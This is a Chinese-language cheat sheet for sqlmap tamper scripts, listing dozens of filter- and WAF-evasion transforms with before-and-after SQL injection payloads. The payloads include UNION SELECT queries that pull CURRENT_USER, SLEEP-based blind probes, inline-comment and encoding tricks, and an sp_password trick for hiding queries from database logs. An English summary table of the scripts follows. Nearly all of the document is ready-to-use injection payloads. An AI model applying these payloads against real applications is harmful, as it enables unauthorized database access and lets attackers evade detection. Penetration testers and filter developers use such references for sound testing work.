# 常用脚本

用法: 添加参数 `--tamper "scriptname"`

## 绕过空格检测

### **space2plus.py**

适用数据库：ALL  
作用：用加号替换空格  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT+id+FROM+users`

### **multiplespaces.py**

适用数据库：ALL  
作用：围绕 sql 关键字添加多个空格  
使用脚本前：`tamper('1 UNION SELECT foobar')`  
使用脚本后：`1 UNION SELECT foobar`

### **space2randomblank.py**

适用数据库：ALL  
作用：将空格替换为其他有效字符  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT%0Did%0DFROM%0Ausers`

### **space2dash.py**

适用数据库：ALL  
作用：将空格替换为`--`，并添加一个随机字符串和换行符  
使用脚本前：`tamper('1 AND 9227=9227')`  
使用脚本后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`

### **space2mysqldash.py**

适用数据库：MySQL、MSSQL  
作用：将空格替换为 `--` ，并追随一个换行符  
使用脚本前：`tamper('1 AND 9227=9227')`  
使用脚本后：`1--%0AAND--%0A9227=9227`

### **space2hash.py**

适用数据库：ALL  
作用：pounds comment character “#” followed by a linefeed a random string of characters and replace the space character

### **space2morehash.py**

适用数据库：MySQL >= 5.1.13  
测试通过数据库：MySQL 5.1.41  
作用：将空格替换为`#`，并添加一个随机字符串和换行符  
使用脚本前：`tamper('1 AND 9227=9227')`  
使用脚本后：`1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227`

### **space2mssqlhash.py**

适用数据库：Microsoft SQL Server  
作用：pounds comment symbol “#” followed by a space character to replace newline

### **space2mysqlblank.py**

适用数据库：MySQL  
测试通过数据库：MySQL 5.1  
作用：将空格替换为其他空格符号`('%09', '%0A', '%0C', '%0D', '%0B')`  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT%0Bid%0DFROM%0Cusers`

### **space2mssqlblank.py**

适用数据库：Microsoft SQL Server  
测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005  
作用：将空格随机替换为其他空格符号`('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')`  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT%0Eid%0DFROM%07users`

### **space2comment.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：将空格替换为`/**/`  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT/**/id/**/FROM/**/users`

## 绕过关键字检测

### **randomcase.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：随机大小写  
使用脚本前：`tamper('INSERT')`  
使用脚本后：`INseRt`

### **versionedkeywords.py**

适用数据库：MySQL  
测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11  
作用：注释绕过  
使用脚本前：`tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')`  
使用脚本后：`1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#`

### **halfversionedmorekeywords.py**

适用数据库：MySQL < 5.1  
测试通过数据库：MySQL 4.0.18/5.0.22  
作用：在每个关键字前添加 mysql 版本注释  
使用脚本前：`tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")`  
使用脚本后：`value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa`

### **randomcomments.py**

适用数据库：ALL  
作用：用注释符分割 sql 关键字  
使用脚本前：`tamper('INSERT')`  
使用脚本后：`I/**/N/**/SERT`

### **ifnull2ifisnull.py**

适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)  
测试通过数据库：MySQL 5.0 and 5.5  
作用：将类似于`IFNULL(A, B)`替换为`IF(ISNULL(A), B, A)`，绕过对`IFNULL`的过滤  
使用脚本前：`tamper('IFNULL(1, 2)')`  
使用脚本后：`IF(ISNULL(1),2,1)`

### **percentage.py**

适用数据库：ASP  
测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0  
作用：在每个字符前添加一个`%`  
使用脚本前：`tamper('SELECT FIELD FROM TABLE')`  
使用脚本后：`%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E`

## 绕过符号检测

### **apostrophemask.py**

适用数据库：ALL  
作用：将引号替换为 utf-8，用于过滤单引号  
使用脚本前：`tamper("1 AND '1'='1")`  
使用脚本后：`1 AND %EF%BC%871%EF%BC%87=%EF%BC%871`

### **between.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：用`NOT BETWEEN 0 AND #`替换`>`  
使用脚本前：`tamper('1 AND A > B--')`  
使用脚本后：`1 AND A NOT BETWEEN 0 AND B--`

### **greatest.py**

测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：将`>`替换为 GREATEST，绕过对`>`的过滤  
使用脚本前：`tamper('1 AND A > B')`  
使用脚本后：`1 AND GREATEST(A,B+1)=A`

### **equaltolike.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5  
作用：将`=`替换为`LIKE`  
使用脚本前：`tamper('SELECT * FROM users WHERE id=1')`  
使用脚本后：`SELECT * FROM users WHERE id LIKE 1`

### **bluecoat.py**

适用数据库：Blue Coat SGOS  
测试通过数据库：MySQL 5.1,、SGOS  
作用：在 sql 语句之后用有效的随机空白字符替换空格符，随后用`LIKE`替换`=`  
使用脚本前：`tamper('SELECT id FROM users where id = 1')`  
使用脚本后：`SELECT%09id FROM users where id LIKE 1`

### **unmagicquotes.py**

适用数据库：ALL  
作用：用一个多字节组合`%bf%27`和末尾通用注释一起替换空格  
使用脚本前：`tamper("1' AND 1=1")`  
使用脚本后：`1%bf%27 AND 1=1--`

## 其他脚本

### **base64encode.py**

适用数据库：ALL  
作用：替换为 base64 编码  
使用脚本前：`tamper("1' AND SLEEP(5)#")`  
使用脚本后：`MScgQU5EIFNMRUVQKDUpIw==`

### **nonrecursivereplacement.py**

适用数据库：ALL  
作用：作为双重查询语句，用双重语句替代预定义的 sql 关键字（适用于非常弱的自定义过滤器，例如将 select 替换为空）  
使用脚本前：`tamper('1 UNION SELECT 2--')`  
使用脚本后：`1 UNIOUNIONN SELESELECTCT 2--`

### **unionalltounion.py**

适用数据库：ALL  
作用：将`union allselect` 替换为`unionselect`  
使用脚本前：`tamper('-1 UNION ALL SELECT')`  
使用脚本后：`-1 UNION SELECT`

### **securesphere.py**

适用数据库：ALL  
作用：追加特定的字符串  
使用脚本前：`tamper('1 AND 1=1')`  
使用脚本后：`1 AND 1=1 and '0having'='0having'`

### **sp_password.py**

适用数据库：MSSQL  
作用：从 T-SQL 日志的自动迷糊处理的有效载荷中追加 sp_password  
使用脚本前：`tamper('1 AND 9227=9227-- ')`  
使用脚本后：`1 AND 9227=9227-- sp_password`

### **charencode.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：对给定的 payload 全部字符使用 url 编码（不处理已经编码的字符）  
使用脚本前：`tamper('SELECT FIELD FROM%20TABLE')`  
使用脚本后：`%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45`

### **charunicodeencode.py**

适用数据库：ASP、ASP.NET  
测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3  
作用：适用字符串的 unicode 编码  
使用脚本前：`tamper('SELECT FIELD%20FROM TABLE')`  
使用脚本后：`%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045`

### **modsecurityversioned.py**

适用数据库：MySQL  
测试通过数据库：MySQL 5.0  
作用：过滤空格，使用 mysql 内联注释的方式进行注入  
使用脚本前：`tamper('1 AND 2>1--')`  
使用脚本后：`1 /*!30874AND 2>1*/--`

### **modsecurityzeroversioned.py**

适用数据库：MySQL  
测试通过数据库：MySQL 5.0  
作用：使用内联注释方式`（/*!00000*/）`进行注入  
使用脚本前：`tamper('1 AND 2>1--')`  
使用脚本后：`1 /*!00000AND 2>1*/--`

### **apostrophenullencode.py**

适用数据库：ALL  
作用：用非法双字节 Unicode 字符替换单引号  
使用脚本前：`tamper("1 AND '1'='1")`  
使用脚本后：`1 AND %00%271%00%27=%00%271`

### **appendnullbyte.py**

适用数据库：ALL  
作用：在有效载荷的结束位置加载 null 字节字符编码  
使用脚本前：`tamper('1 AND 1=1')`  
使用脚本后：`1 AND 1=1%00`

### **chardoubleencode.py**

适用数据库：ALL  
作用：对给定的 payload 全部字符使用双重 url 编码（不处理已经编码的字符）  
使用脚本前：`tamper('SELECT FIELD FROM%20TABLE')`  
使用脚本后：`%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545`

## RAW

| Tamper | Description |
| --- | --- |
|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
|base64encode.py | Base64 all characters in a given payload  |
|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
|equaltolike.py | Replaces all occurances of operator equal ('=') with operator 'LIKE'  |
|escapequotes.py | Slash escape quotes (' and ") |
|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|modsecurityversioned.py | Embraces complete query with versioned comment |
|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
|multiplespaces.py | Adds multiple spaces around SQL keywords |
|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|percentage.py | Adds a percentage sign ('%') infront of each character  |
|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
|randomcase.py | Replaces each keyword character with random case value |
|randomcomments.py | Add random comments to SQL keywords|
|securesphere.py | Appends special crafted string|
|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
|space2comment.py | Replaces space character (' ') with comments |
|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
|space2plus.py |  Replaces space character (' ') with plus ('+')  |
|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
|varnish.py | Append a HTTP header 'X-originating-IP' |
|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|

内容参考：
<https://blog.csdn.net/qq_34444097/article/details/82717357>
<https://github.com/thryb/sqlmap-tamper/blob/master/README.md>
